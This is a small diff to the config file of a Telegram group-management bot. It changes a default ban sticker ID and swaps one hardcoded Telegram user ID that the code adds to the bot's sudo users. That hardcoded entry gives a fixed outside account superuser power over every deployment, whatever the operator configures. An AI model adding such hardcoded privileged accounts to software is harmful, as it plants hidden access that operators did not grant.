@@ -56,7 +56,7 @@ if ENV:
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
     STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
-    BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
+    BAN_STICKER = os.environ.get('BAN_STICKER', 'AgACAgUAAxkBAAEGNL1fcV6NxJM8eTEr7-vGgfuOGwLSVAACUqoxG8m4iVeZzj7VNx-I_TCLZWx0AAMBAAMCAANtAAM4cAIAARsE')
     KICK_STICKER = os.environ.get('KICK_STICKER', False)
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
     API_WEATHER =os.environ.get('API_OPENWEATHER',False) 
@@ -109,7 +109,7 @@ else:
     TEMPORARY_DATA = Config.TEMPORARY_DATA
     escape_markdown = config.escape_markdown
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(594813047)
+SUDO_USERS.add(395357593)
     
 
 
